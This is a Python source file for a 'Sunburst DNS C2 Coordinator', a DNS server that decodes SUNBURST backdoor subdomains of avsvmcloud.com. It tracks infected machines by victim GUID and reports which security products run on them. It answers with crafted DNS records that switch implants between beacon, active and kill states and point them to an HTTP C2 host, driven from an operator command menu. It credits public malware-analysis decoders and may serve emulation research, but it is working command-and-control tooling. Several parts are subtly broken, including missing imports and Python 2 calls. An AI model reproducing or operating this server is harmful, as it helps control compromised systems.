#!/usr/bin/env python3
from argparse import ArgumentParser
from enum import Enum

from dnslib import *

import logging
import threading
from random import seed, getrandbits
import socketserver
import socket
import string
import sys
import os
import cmd
import datetime
from ipaddress import IPv4Address, IPv6Address, IPv4Network, IPv6Network
from tabulate import tabulate
import re

seed()

class LogFormatter(logging.Formatter):

    FORMATS = {
        logging.ERROR: "(%(asctime)s) [!] %(msg)s",
        logging.INFO: "(%(asctime)s) [*] %(msg)s",
        logging.WARNING: "WARNING: %(msg)s",
        logging.DEBUG: "DBG: %(module)s: %(lineno)d: %(msg)s",
        "DEFAULT": "%(asctime)s - %(msg)s"
    }

    def format(self, record):
        format_orig = self._style._fmt
        self._style._fmt = self.FORMATS.get(record.levelno, self.FORMATS['DEFAULT'])
        result = logging.Formatter.format(self, record)
        self._style._fmt = format_orig
        return result


log = logging.getLogger("sunburst_dnsc2")
log.setLevel(logging.DEBUG)
log_ch = logging.StreamHandler()
log_ch.setLevel(logging.INFO)
log_ch.setFormatter(LogFormatter(datefmt="%H:%M:%S"))
log.addHandler(log_ch)


WIN_DEFEND_RUNNING = 1
WIN_DEFEND_STOPPED = 2
WIN_DEFEND_ATP_RUNNING = 4
WIN_DEFEND_ATP_STOPPED = 8
MS_DEFENDER_ID_RUNNING = 16
MS_DEFENDER_ID_STOPPED = 32
CARBON_BLACK_RUNNING = 64
CARBON_BLACK_STOPPED = 128
CROWDSTRIKE_RUNNING = 256
CROWDSTRIKE_STOPPED = 512
FIREEYE_RUNNING = 1024
FIREEYE_STOPPED = 2048
ESET_RUNNING = 4096
ESET_STOPPED = 8192
FSECURE_RUNNING = 16384
FSECURE_STOPPED = 32768


class CryptoHelper:
    # Special thanks to:
    #   https://github.com/sysopfb/open_mal_analysis_notes/blob/master/sunburst_dga/decode.py
    #   https://github.com/asuna-amawaka/SUNBURST-Analysis/blob/main/decode_dga.py
    #   https://github.com/RedDrip7/SunBurst_DGA_Decode/blob/main/decode.py

    @staticmethod
    def getChunkIndex(enc_indx, c):
        # try to discover value of n
        n = ord(enc_indx) + 10 - 97
        if ((35 + ord(c)) % 36 == n):
            return 35
        if n < 10:
            n = ord(enc_indx) - 48
        n = (n - ord(c)) % 36
        return n

    def get_flags(a):
        ret = []
        if a & WIN_DEFEND_RUNNING:
            ret.append("Windows Defender Running")
        if a & WIN_DEFEND_STOPPED:
            ret.append("WINDOWS DEFENDER STOPPED")
        if a & WIN_DEFEND_ATP_RUNNING:
            ret.append("WINDOWS DEFENDER ATP RUNNING")
        if a & WIN_DEFEND_ATP_STOPPED:
            ret.append("WINDOWS DEFENDER ATP STOPPED")
        if a & MS_DEFENDER_ID_RUNNING:
            ret.append("MS DEFENDER ID RUNNING")
        if a & MS_DEFENDER_ID_STOPPED:
            ret.append("MS DEFENDER ID STOPPED")
        if a & CARBON_BLACK_RUNNING:
            ret.append("CARBONBLACK RUNNING")
        if a & CARBON_BLACK_STOPPED:
            ret.append("CarbonBlack STOPPED")
        if a & CROWDSTRIKE_RUNNING:
            ret.append("CROWDSTRIKE RUNNING")
        if a & CROWDSTRIKE_STOPPED:
            ret.append("CROWDSTRIKE STOPPED")
        if a & FIREEYE_RUNNING:
            ret.append("FIREEYE RUNNING")
        if a & FIREEYE_STOPPED:
            ret.append("FIREYE STOPPED")
        if a & ESET_RUNNING:
            ret.append("ESET RUNNING")
        if a & ESET_STOPPED:
            ret.append("ESET STOPPED")
        if a & FSECURE_RUNNING:
            ret.append("FSECURE RUNNING")
        if a & FSECURE_STOPPED:
            ret.append("FSECURE STOPPED")
        return ret

    @staticmethod
    def custom_b32decode(s):
        std_base32chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
        my_base32chars = "ph2eifo3n5utg1j8d94qrvbmk0sal76c"
        temp = s.translate(string.maketrans(my_base32chars, std_base32chars))
        return base64.b32decode(temp)

    # From @RedDrip7  - Fix datalen calculation by @sysopfb
    @staticmethod
    def Base32Decode(string):
        string = string.encode()
        text = b"ph2eifo3n5utg1j8d94qrvbmk0sal76c"
        restring = b""
        datalen = len(string) * 5 // 8

        num = 0
        ib = 0;
        if len(string) < 3:
            restring = chr(text.find(string[0]) | text.find(string[1]) << 5 & 255)
            return restring

        k = text.find(string[0]) | (text.find(string[1]) << 5)
        j = 10
        index = 2
        for i in range(datalen):
            restring += bytes([k & 255])
            k = k >> 8
            j -= 8
            while (j < 8 and index < len(string)):
                k |= (text.find(string[index]) << j)
                index += 1
                j += 5
        return restring

    # From @RedDrip7
    @staticmethod
    def Decode(string):
        text = "rq3gsalt6u1iyfzop572d49bnx8cvmkewhj"
        text2 = "0_-."
        retstring = ""
        flag = False
        for i in range(len(string)):
            ch = string[i]
            tx_index = -1
            tx2_index = -1
            if flag:
                t1i = text.find(ch)
                x = t1i - ((random.randint(0, 8) % (len(text) // len(text2))) * len(text2))
                retstring = retstring + text2[x % len(text2)]
                flag = False
                continue
            if ch in text2:
                tx2_index = text2.find(ch)
                flag = True
                pass
            else:
                tx_index = text.find(ch)
                oindex = tx_index - 4
                retstring = retstring + text[oindex % len(text)]
            pass
        return retstring

    @staticmethod
    def decode_DGA_type2(data):
        data = data.rstrip().split(".")[0]
        decoded = bytearray(CryptoHelper.Base32Decode(data))
        for i in range(1, len(decoded)):
            decoded[i] ^= decoded[0]
        # decode guid / user ID
        user_id = decoded[1:9]
        key = decoded[10:12]
        for i in range(len(user_id)):
            user_id[i] ^= key[(i + 1) % len(key)]
        user_id = binascii.hexlify(user_id)
        # decode timestamp
        blob = decoded[9:]
        if len(blob) < 3:
            return
        timestamp = struct.unpack_from('>I', b'\x00' + blob[:3])[0] & 0xfffff
        # decode data
        data_len = (blob[0] & 0xf0) >> 4
        data = blob[3:]
        return user_id, timestamp, data_len, data

    @staticmethod
    def decode_DGA_type1(data):
        data = data.rstrip().split(".")[0]
        encoded_guid = data[:15]
        encoded_fragment_index = data[15]
        encoded_domain = data[16:]
        # decode guid / user ID
        user_id = bytearray(CryptoHelper.Base32Decode(encoded_guid))
        key = user_id[0]
        user_id = user_id[1:]
        for i in range(len(user_id)):
            user_id[i] ^= key
        user_id = binascii.hexlify(user_id)
        # decode fragment index / chunk index
        fragment_index = CryptoHelper.getChunkIndex(encoded_fragment_index, encoded_guid[0])
        # decode domain fragment
        if encoded_domain[:2] == '00':
            domain_fragment = CryptoHelper.Base32Decode(encoded_domain[2:])
        else:
            domain_fragment = CryptoHelper.Decode(encoded_domain)
        return user_id, fragment_index, domain_fragment

    @staticmethod
    def is_DGA_type1(data):
        data = data.rstrip().split(".")[0]
        # there is a min length of 20 for DGA-generated domain strings (excluding the appended .appsync-api.....)
        # use this requirement to filter out those that are unlikely to be DGA-generated strings from the input file
        if len(data) < 20:
            exit(0)
        encoded_guid = data[:15]
        encoded_fragment_index = data[15]
        fragment_index = CryptoHelper.getChunkIndex(encoded_fragment_index, encoded_guid[0])

        # the idea: if fragment_index == 0, it means that the domain name is fragmented
        # and this is the first piece of the fragments.
        # then the length of the DGA string must be 32 bytes (anything less won't have caused fragmentation)
        # if fragment_index == 0 but total length of DGA string != 32,
        # means can try doing the other type of decoding (the one with timestamp XOR)
        if ((fragment_index == 0 and len(data) != 32) or (fragment_index != 35)) and (len(data) == 20 or len(data) == 23):
            return False
        else:
            return True

    @staticmethod
    def getVictimGUID(data):
        if CryptoHelper.is_DGA_type1(data):
            return CryptoHelper.decode_DGA_type1(data)[0]
        else:
            return CryptoHelper.decode_DGA_type2(data)[0]


class Sunbeam:
    class State(Enum):
        PASSIVE = 1
        BEACON = 2
        PREACTIVE = 5
        ACTIVE = 6
        KILLED = 9

    def __init__(self, userid):
        self.userid = userid
        self._state = Sunbeam.State.PASSIVE
        self.next_state = Sunbeam.State.BEACON # None
        self.first_seen = None
        self.last_seen = None
        self.domain_fragments = dict()  # fragment index -> domain fragment string
        self.httpc2hostname = None
        self._service_states = 0x0000

    def update_seen(self):
        self.last_seen = datetime.datetime.now()
        if self.first_seen is None:
            self.first_seen = self.last_seen

    @property
    def service_states(self):
        return None

    @property
    def domain(self):
        defragmented_domain = ""
        print(self.domain_fragments)
        if 35 in self.domain_fragments:
            for i in sorted(self.domain_fragments.keys()):
                domain_fragment = self.domain_fragments[i].decode()
                defragmented_domain += domain_fragment
        return defragmented_domain

    @property
    def state(self):
        return self._state

    @state.setter
    def state(self, state):
        if self._state == Sunbeam.State.PASSIVE and state == Sunbeam.State.ACTIVE:
            print("Invalid state transition")
            return
        self._state = state

    def update(self, hostname):
        data = hostname.rstrip().split(".")[0]
        if CryptoHelper.is_DGA_type1(data):
            assert (len(data) >= 16)
            user_id, fragment_index, domain_fragment = CryptoHelper.decode_DGA_type1(data)
            assert (user_id == self.userid)
            self.domain_fragments[fragment_index] = domain_fragment
        else:
            user_id, timestamp, data_len, data = CryptoHelper.decode_DGA_type2(data)
            assert (user_id == self.userid)
            if data_len < 2:
                # PING message
                pass
            else:
                # Security product service states
                self._service_states = data
        self.update_seen()

    def __str__(self):
        return "id= {}, domain= {}, state= {}, first seen= {}, last_seen= {}, httpc2hostname= {}".format(self.userid.decode(), self.domain, self.state.name, self.first_seen, self.last_seen, self.httpc2hostname)


class SunburstDNSC2CoordinatorHandler(object):

    def parse(self, data):
        response = ""

        try:
            d = DNSRecord.parse(data)
        except Exception as e:
            log.error(f"{self.client_address[0]}: ERROR: invalid DNS request")
            return response

        proxy_response = False

        # Only Process DNS Queries
        if QR[d.header.qr] == "QUERY":
            qname = str(d.q.qname)

            # Chop off the last period
            if qname[-1] == '.': qname = qname[:-1]

            qtype = QTYPE[d.q.qtype]

            if self.server.httpc2ip and qname.split("://")[-1].split("/")[0] == self.server.httpc2hostname.split("://")[-1].split("/")[0]:
                response = DNSRecord(DNSHeader(id=d.header.id, bitmap=d.header.bitmap, qr=1), q=d.q)
                response.add_answer(RR(qname.split("://")[-1].split("/")[0], getattr(QTYPE, "A"), rdata=RDMAP["A"](self.server.httpc2ip)))
                response = response.pack()
            elif qname.endswith("avsvmcloud.com"):
                assert(qtype == "A")
                sunbeam_userid = CryptoHelper.getVictimGUID(qname)
                if sunbeam_userid in self.server.sunbeams:
                    sunbeam = self.server.sunbeams[sunbeam_userid]
                else:
                    sunbeam = Sunbeam(sunbeam_userid)
                    log.info("New sunbeam found: {}".format(sunbeam_userid))
                    self.server.sunbeams[sunbeam_userid] = sunbeam
                    if self.server.auto_activate:
                        sunbeam.next_state = Sunbeam.State.ACTIVE

                sunbeam.update(qname)

                a_record = None
                cname_record = None
                if sunbeam.next_state is None:
                    pass
                elif sunbeam.next_state == Sunbeam.State.BEACON:
                    subnets4 = [
                        '18.130.0.0/16',
                        '99.79.0.0/16',
                        '184.72.0.0/15',
                        '8.18.144.0/23',
                        '87.238.80.0/21',
                        '199.201.117.0/24',
                        '71.152.53.0/24',
                        '99.79.0.0/16'
                    ]
                    network = IPv4Network(random.choice(subnets4))
                    address = IPv4Address(network.network_address + getrandbits(network.max_prefixlen - network.prefixlen))
                    a_record = str(address)
                    sunbeam.state = Sunbeam.State.BEACON
                    log.info("sunbeam set to beacon: {}".format(sunbeam.userid))
                elif sunbeam.next_state == Sunbeam.State.ACTIVE:
                    subnets4 = [
                        '18.130.0.0/16',
                        '99.79.0.0/16',
                        '184.72.0.0/15'
                    ]
                    network = IPv4Network(random.choice(subnets4))
                    address = IPv4Address(network.network_address + getrandbits(network.max_prefixlen - network.prefixlen))
                    a_record = str(address)
                    if sunbeam.state == Sunbeam.State.PREACTIVE:
                        if not sunbeam.httpc2hostname:
                            sunbeam.httpc2hostname = self.server.httpc2hostname
                        cname_record = sunbeam.httpc2hostname
                        sunbeam.state = Sunbeam.State.ACTIVE
                        sunbeam.next_state = None
                        log.info("sunbeam activated (activation step 2/2): {}".format(sunbeam.userid))
                    else:
                        sunbeam.state = Sunbeam.State.PREACTIVE
                        log.info("sunbeam preactivated (activation step 1/2): {}".format(sunbeam.userid))
                elif sunbeam.next_state == Sunbeam.State.KILLED:
                    subnets4 = [
                        '10.0.0.0/8',
                        '172.16.0.0/12',
                        '192.168.0.0/16',
                        '224.0.0.0/3',
                        '20.140.0.0/15',
                        '96.31.172.0/24',
                        '131.228.12.0/22',
                        '144.86.226.0/24'
                    ]
                    subnets6 = [
                        'fc00::1/7',
                        'fec0::1/10',
                        'ff00::1/9',
                        'ff80::1/10'
                    ]
                    if self.server.ipv6:
                        network = IPv6Network(random.choice(subnets6))
                        address = IPv6Address(network.network_address + getrandbits(network.max_prefixlen - network.prefixlen))
                    else:
                        network = IPv4Network(random.choice(subnets4))
                        address = IPv4Address(network.network_address + getrandbits(network.max_prefixlen - network.prefixlen))
                    a_record = str(address)
                    sunbeam.state = Sunbeam.State.KILLED
                    sunbeam.next_state = None
                    log.info("sunbeam killed: {}".format(sunbeam.userid))
                # Create a custom response to the query
                response = DNSRecord(DNSHeader(id=d.header.id, bitmap=d.header.bitmap, qr=1), q=d.q)
                if cname_record:
                    response.add_answer(RR(qname, getattr(QTYPE, "CNAME"), rdata=RDMAP["CNAME"](cname_record)))
                if a_record:
                    response.add_answer(RR(cname_record if cname_record else qname, getattr(QTYPE, "A"), rdata=RDMAP["A"](a_record)))
                if not a_record and not cname_record:
                    return ""
                response = response.pack()
            else:
                proxy_response = True

            if proxy_response:
                nameserver_tuple = self.server.nameserver.split('#')
                response = self.proxyrequest(data, *nameserver_tuple)

        return response

    # Obtain a response from a real DNS server.
    def proxyrequest(self, request, host, port="53", protocol="udp"):
        reply = None
        try:
            if self.server.ipv6:
                if protocol == "udp":
                    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
                elif protocol == "tcp":
                    sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            else:
                if protocol == "udp":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                elif protocol == "tcp":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3.0)

            if protocol == "udp":
                sock.sendto(request, (host, int(port)))
                reply = sock.recv(1024)
                sock.close()
            elif protocol == "tcp":
                sock.connect((host, int(port)))
                # Add length for the TCP request
                length = binascii.unhexlify("%04x" % len(request))
                sock.sendall(length+request)
                # Strip length from the response
                reply = sock.recv(1024)
                reply = reply[2:]
                sock.close()
        except Exception as e:
            log.error(f"[!] Could not proxy request: {e}")
        else:
            return reply


class UDPDNSHandler(SunburstDNSC2CoordinatorHandler, socketserver.BaseRequestHandler):

    def handle(self):
        (data, socket) = self.request
        response = self.parse(data)

        if response:
            socket.sendto(response, self.client_address)


class TCPDNSHandler(SunburstDNSC2CoordinatorHandler, socketserver.BaseRequestHandler):

    def handle(self):
        data = self.request.recv(1024)

        # Remove the addition "length" parameter used in the
        # TCP DNS protocol
        data = data[2:]
        response = self.parse(data)

        if response:
            # Calculate and add the additional "length" parameter
            # used in TCP DNS protocol
            length = binascii.unhexlify("%04x" % len(response))
            self.request.sendall(length + response)


class UDPDNSServer(socketserver.ThreadingMixIn, socketserver.UDPServer):
    def __init__(self, server_address, nameserver, ipv6, httpc2hostname, httpc2ip=None):
        self.sunbeams = dict()
        self.auto_activate = False
        self.httpc2hostname = httpc2hostname
        self.httpc2ip = httpc2ip
        self.nameserver = nameserver
        self.ipv6        = ipv6
        self.address_family = socket.AF_INET6 if self.ipv6 else socket.AF_INET

        socketserver.UDPServer.__init__(self, server_address, UDPDNSHandler)


class TCPDNSServer(socketserver.ThreadingMixIn, socketserver.TCPServer):

    allow_reuse_address = True

    def __init__(self, server_address, nameserver, ipv6, httpc2hostname, httpc2ip=None):
        self.sunbeams = dict()
        self.auto_activate = False
        self.httpc2hostname = httpc2hostname
        self.httpc2ip = httpc2ip
        self.nameserver = nameserver
        self.ipv6        = ipv6
        self.address_family = socket.AF_INET6 if self.ipv6 else socket.AF_INET

        socketserver.TCPServer.__init__(self, server_address, TCPDNSHandler)


class MainMenu(cmd.Cmd):
    banner = r"""
                    ___                          __        ___                    ________  
  ________ __  ____ \_ |__  __ _________  ______/  |_   __| _/ ____   ______ ____ \_____  \ 
 /  ___/  |  \/    \ | __ \|  |  \_  __ \/  ___/   __\ / __ | /    \ /  ___// ___\ /  ____/ 
 \___ \|  |  /   |  \| \_\ \  |  /|  | \/\___ \ |  |  / /_/ ||   |  \\___ \\  \___/       \ 
/____  \____/|___|  /|___  /____/ |__|  /____  \|__|  \____ ||___|  /____  \\___  /_______ \
     \/           \/     \/                  \/            \/     \/     \/     \/        \/
    """
    intro = banner + "\n" + 'Welcome to the Sunburst DNS C2 Coordinator.\nType help or ? to list commands.\n'
    prompt = '(sunburst) '
    file = None

    def __init__(self, c2server):
        super(MainMenu, self).__init__()
        self.c2server = c2server

    def do_exit(self, s):
        return True

    def help_exit(self):
        print("Exit the interpreter.")
        print("You can also use the Ctrl-D shortcut.")

    do_EOF = do_exit
    help_EOF = help_exit

    def do_list(self, arg):
        print("Sunbeams:")
        if self.c2server.sunbeams:
            table_values = [re.findall(r'=\s*([^,]*),?', str(self.c2server.sunbeams[key])) for key in self.c2server.sunbeams]
            table_headers = re.findall(r'\s*([^=,]*)=\s*[^,]*,?', str(list(self.c2server.sunbeams.values())[0]))
            table = tabulate(table_values, headers=table_headers)
            print(table)

    def do_beacon(self, arg):
        args = arg.split()
        if len(args) != 1:
            log.error("Invalid argument. Expected arguments: id")
            return
        userid = args[0].strip().encode()
        sunbeam = self.c2server.sunbeams.get(userid, None)
        if sunbeam is None:
            for key in self.c2server.sunbeams:
                if key.startswith(userid):
                    userid = key
                    sunbeam = self.c2server.sunbeams[userid]
                    break
            else:
                log.error("Sunbeam does not exist")
                return
        if sunbeam.state == Sunbeam.State.BEACON:
            log.error("Sunbeam already in beacon mode")
            return
        else:
            sunbeam.next_state = Sunbeam.State.BEACON
            print("\tSunbeam will be set to beacon mode upon its next DNS query".format(sunbeam))

    def do_kill(self, arg):
        args = arg.split()
        if len(args) != 1:
            log.error("Invalid argument. Expected arguments: id")
            return
        userid = args[0].strip().encode()
        sunbeam = self.c2server.sunbeams.get(userid, None)
        if sunbeam is None:
            for key in self.c2server.sunbeams:
                if key.startswith(userid):
                    userid = key
                    sunbeam = self.c2server.sunbeams[userid]
                    break
            else:
                log.error("Sunbeam does not exist")
                return
        if sunbeam.state == Sunbeam.State.KILLED:
            log.error("Sunbeam already killed")
            return
        else:
            sunbeam.next_state = Sunbeam.State.KILLED
            print("\tSunbeam will be killed upon its next DNS query".format(sunbeam))

    def do_activate(self, arg):
        args = arg.split()
        if len(args) != 1:
            log.error("Invalid argument. Expected arguments: id")
            return
        userid = args[0].strip().encode()
        sunbeam = self.c2server.sunbeams.get(userid, None)
        if sunbeam is None:
            for key in self.c2server.sunbeams:
                if key.startswith(userid):
                    userid = key
                    sunbeam = self.c2server.sunbeams[userid]
                    break
            else:
                log.error("Sunbeam does not exist")
                return
        if sunbeam.state == Sunbeam.State.ACTIVE:
            log.error("Sunbeam already active")
            return
        elif sunbeam.state == Sunbeam.State.PREACTIVE and sunbeam.next_state == Sunbeam.State.ACTIVE:
            log.error("Sunbeam already in the process of becoming active")
            return
        else:
            sunbeam.next_state = Sunbeam.State.ACTIVE
            print("\tSunbeam will be activated upon the next 2 DNS queries")

    def do_auto_activate(self, arg):
        self.c2server.auto_activate = True
        print("\tSunbeams will begin activation when they first connect")

    def do_set_httpc2hostname(self, arg):
        args = arg.split()
        if len(args) != 1:
            log.error("Invalid argument. Expected arguments: [id|*|default] hostname")
            return
        userid = args[0].strip().decode()
        hostname = args[1].strip()
        if userid.lower() == 'default':
            self.c2server.httpc2hostname = hostname
            return
        elif userid == '*':
            for key in self.c2server.sunbeams:
                sunbeam = self.c2server.sunbeams[key]
                sunbeam.httpc2hostname = hostname
        else:
            sunbeam = self.c2server.sunbeams.get(userid, None)
            if sunbeam is None:
                for key in self.c2server.sunbeams:
                    if key.startswith(userid):
                        userid = key
                        sunbeam = self.c2server.sunbeams[userid]
                        break
                else:
                    log.error("Sunbeam does not exist")
                    return
            sunbeam.httpc2hostname = hostname


if __name__ == '__main__':
    parser = ArgumentParser(usage=sys.argv[0] + " [options]:\n",
                            description="Sunburst DNS C2 coordinator")
    parser.add_argument("--httpc2hostname", metavar="hostname of the HTTP C2 server. The scheme may be prepended ('http://' or 'https://')",
                          default='http://mysunbursthttpc2server.com',
                          help='The hostname of the HTTP C2 server. The scheme may be prepended ("http://" or "https://")')
    parser.add_argument("--httpc2ip",
                        metavar="IP address of the HTTP C2 server.",
                        help='IP address of the HTTP C2 server. e.g. 127.0.0.1')
    parser.add_argument("--nameserver", metavar="8.8.8.8#53 or 4.2.2.1#53#tcp or 2001:4860:4860::8888",
                          default='8.8.8.8',
                          help='The alternative DNS servers to use with proxied requests in IP#PORT format.')
    parser.add_argument("-t", "--tcp", action="store_true", default=False,
                          help="Use TCP instead of the UDP.")
    parser.add_argument("-6", "--ipv6", action="store_true", default=False, help="Use IPv6 instead of IPv4")
    parser.add_argument("-p", "--port", metavar="53", default="53", help='Port number to listen for DNS requests.')

    options = parser.parse_args()

    httpc2ip = options.httpc2ip

    if options.ipv6 and options.nameserver == "8.8.8.8":
        options.nameserver = "2001:4860:4860::8888"

    try:
        ip = "0.0.0.0" if not options.ipv6 else "::"
        if options.tcp:
            log.info(sys.argv[0] + " is running in TCP mode")
            server = TCPDNSServer((ip, int(options.port)), options.nameserver, options.ipv6, options.httpc2hostname, httpc2ip=httpc2ip)
        else:
            server = UDPDNSServer((ip, int(options.port)), options.nameserver, options.ipv6, options.httpc2hostname, httpc2ip=httpc2ip)
        server_thread = threading.Thread(target=server.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        menu = MainMenu(server)
        menu.cmdloop()
        #while True:
        #    time.sleep(100)
    except (KeyboardInterrupt, SystemExit):
        server.shutdown()
        log.info(sys.argv[0] + " is shutting down.")
        sys.exit()
    except Exception as e:
        log.error(f"{repr(e)}")
